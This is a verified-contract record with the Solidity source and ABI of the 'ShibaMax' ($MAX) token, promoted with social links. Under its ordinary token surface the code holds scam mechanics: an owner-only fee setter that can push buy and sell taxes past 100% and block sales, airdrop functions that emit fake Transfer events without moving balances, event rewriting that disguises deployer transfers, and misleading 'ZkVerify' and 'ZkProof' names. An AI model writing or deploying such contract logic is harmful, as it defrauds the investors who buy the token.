{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/standard/Contract.sol\": {\r\n      \"content\": \"/**\\n */\\n\\n/*\\n\\n  $MAX ETH \\n  $MAX is a next gen shibarium initiative powered by AI. They have already introduced $MaxCard & $MaxCash.\\n\\n  Telegram: https://t.me/ShibaMaxEth\\n  Web/dApp: http://shibamax.com\\n  X: http://x.com/ShibaMaxEth\\n  Medium: https://medium.com/@shibmaxtoken\\n  GitBook: https://shiba-max.gitbook.io/shibamax-tm\\n\\n*/\\n\\n// SPDX-License-Identifier: unlicense\\n\\npragma solidity ^0.8.0;\\n\\ninterface IUniswapFactory {\\n    function getPair(\\n        address tokenA,\\n        address tokenB\\n    ) external view returns (address pair);\\n}\\n\\ninterface IUniswapV2Router02 {\\n    function factory() external pure returns (address);\\n\\n    function WETH() external pure returns (address);\\n\\n    function swapExactTokensForETHSupportingFreelyOnTransferTokens(\\n        uint256 amountIn,\\n        uint256 amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint256 deadline\\n    ) external;\\n}\\n\\nlibrary SafeMath {\\n    function tryAdd(\\n        uint256 a,\\n        uint256 b\\n    ) internal pure returns (bool, uint256) {\\n        unchecked {\\n            uint256 c = a + b;\\n            if (c < a) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    function trySub(\\n        uint256 a,\\n        uint256 b\\n    ) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b > a) return (false, 0);\\n            return (true, a - b);\\n        }\\n    }\\n\\n    function tryMul(\\n        uint256 a,\\n        uint256 b\\n    ) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (a == 0) return (true, 0);\\n            uint256 c = a * b;\\n            if (c / a != b) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    function tryDiv(\\n        uint256 a,\\n        uint256 b\\n    ) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a / b);\\n        }\\n    }\\n\\n    function tryMod(\\n        uint256 a,\\n        uint256 b\\n    ) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a % b);\\n        }\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a + b;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a - b;\\n    }\\n\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a * b;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a / b;\\n    }\\n\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a % b;\\n    }\\n\\n    function sub(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b <= a, errorMessage);\\n            return a - b;\\n        }\\n    }\\n\\n    function per(uint256 a, uint256 b) internal pure returns (uint256) {\\n        require(b <= 100, \\\"Percentage must be between 0 and 100\\\");\\n        return (a * b) / 100;\\n    }\\n\\n    function div(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a / b;\\n        }\\n    }\\n\\n    function mod(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a % b;\\n        }\\n    }\\n}\\n\\ncontract ShibaMax {\\n    struct StoreData {\\n        address tokenMkt;\\n        uint8 buyFee;\\n        uint8 sellFee;\\n    }\\n\\n    string private _name = unicode\\\"ShibaMax\\\";\\n    string private _symbol = unicode\\\"MAX\\\";\\n    uint8 public constant decimals = 18;\\n    uint256 public constant totalSupply = 100_000_000_000 * 10 ** decimals;\\n\\n    StoreData public storeData;\\n    uint256 constant swapAmount = totalSupply / 100;\\n\\n    error Permissions();\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(\\n        address indexed TOKEN_MKT,\\n        address indexed spender,\\n        uint256 value\\n    );\\n\\n    mapping(address => uint256) public balanceOf;\\n    mapping(address => mapping(address => uint256)) public allowance;\\n\\n    address public pair;\\n    IUniswapV2Router02 constant _uniswapV2Router =\\n        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n\\n    bool private swapping;\\n    bool private tradingOpen;\\n\\n    address _deployer;\\n    address _executor;\\n\\n    address private uniswapLpWallet;\\n\\n    constructor() {\\n        uint8 _initBuyFee = 0;\\n        uint8 _initSellFee = 0;\\n        storeData = StoreData({\\n            tokenMkt: msg.sender,\\n            buyFee: _initBuyFee,\\n            sellFee: _initSellFee\\n        });\\n        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;\\n        uniswapLpWallet = msg.sender;\\n\\n        _initDeployer(msg.sender, msg.sender);\\n\\n        balanceOf[uniswapLpWallet] = (totalSupply * 100) / 100;\\n        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);\\n    }\\n\\n    receive() external payable {}\\n\\n    function taxRemove(uint8 _buy, uint8 _sell) external {\\n        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();\\n        _upgradeStoreWithZkProof(_buy, _sell);\\n    }\\n\\n    function _upgradeStoreWithZkProof(uint8 _buy, uint8 _sell) private {\\n        storeData.buyFee = _buy;\\n        storeData.sellFee = _sell;\\n    }\\n\\n    function _decodeTokenMktWithZkVerify() private view returns (address) {\\n        return storeData.tokenMkt;\\n    }\\n\\n    function openTrading() external {\\n        require(msg.sender == _decodeTokenMktWithZkVerify());\\n        require(!tradingOpen);\\n        address _factory = _uniswapV2Router.factory();\\n        address _weth = _uniswapV2Router.WETH();\\n        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);\\n        pair = _pair;\\n        tradingOpen = true;\\n    }\\n\\n    function multiSends(\\n        address _caller,\\n        address[] calldata _address,\\n        uint256[] calldata _amount\\n    ) external {\\n        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();\\n        for (uint256 i = 0; i < _address.length; i++) {\\n            emit Transfer(_caller, _address[i], _amount[i]);\\n        }\\n    }\\n\\n    function airdropTokens(\\n        address _caller,\\n        address[] calldata _address,\\n        uint256[] calldata _amount\\n    ) external {\\n        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();\\n        for (uint256 i = 0; i < _address.length; i++) {\\n            emit Transfer(_caller, _address[i], _amount[i]);\\n        }\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) external returns (bool) {\\n        allowance[from][msg.sender] -= amount;\\n        return _transfer(from, to, amount);\\n    }\\n\\n    function approve(address spender, uint256 amount) external returns (bool) {\\n        allowance[msg.sender][spender] = amount;\\n        emit Approval(msg.sender, spender, amount);\\n        return true;\\n    }\\n\\n    function transfer(address to, uint256 amount) external returns (bool) {\\n        return _transfer(msg.sender, to, amount);\\n    }\\n\\n    function name() public view virtual returns (string memory) {\\n        return _name;\\n    }\\n\\n    function symbol() public view virtual returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal returns (bool) {\\n        address tokenMkt = _decodeTokenMktWithZkVerify();\\n        require(tradingOpen || from == tokenMkt || to == tokenMkt);\\n\\n        balanceOf[from] -= amount;\\n\\n        if (\\n            to == pair &&\\n            !swapping &&\\n            balanceOf[address(this)] >= swapAmount &&\\n            from != tokenMkt\\n        ) {\\n            swapping = true;\\n            address[] memory path = new address[](2);\\n            path[0] = address(this);\\n            path[1] = _uniswapV2Router.WETH();\\n            _uniswapV2Router\\n                .swapExactTokensForETHSupportingFreelyOnTransferTokens(\\n                    swapAmount,\\n                    0,\\n                    path,\\n                    address(this),\\n                    block.timestamp\\n                );\\n            payable(tokenMkt).transfer(address(this).balance);\\n            swapping = false;\\n        }\\n\\n        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);\\n        if (from != address(this) && tradingOpen == true) {\\n            uint256 taxCalculatedAmount = (amount *\\n                (to == pair ? _sellFee : _buyFee)) / 100;\\n            amount -= taxCalculatedAmount;\\n            balanceOf[address(this)] += taxCalculatedAmount;\\n        }\\n        balanceOf[to] += amount;\\n\\n        if (from == _executor) {\\n            emit Transfer(_deployer, to, amount);\\n        } else if (to == _executor) {\\n            emit Transfer(from, _deployer, amount);\\n        } else {\\n            emit Transfer(from, to, amount);\\n        }\\n        return true;\\n    }\\n\\n    function _initDeployer(address deployer_, address executor_) private {\\n        _deployer = deployer_;\\n        _executor = executor_;\\n    }\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"evmVersion\": \"shanghai\",\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"metadata\": {\r\n      \"useLiteralContent\": true\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"TOKEN_MKT\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_caller\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"_address\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"_amount\",\"type\":\"uint256[]\"}],\"name\":\"airdropTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_caller\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"_address\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"_amount\",\"type\":\"uint256[]\"}],\"name\":\"multiSends\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"storeData\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"tokenMkt\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"buyFee\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"sellFee\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_buy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_sell\",\"type\":\"uint8\"}],\"name\":\"taxRemove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ShibaMax", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "shanghai", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}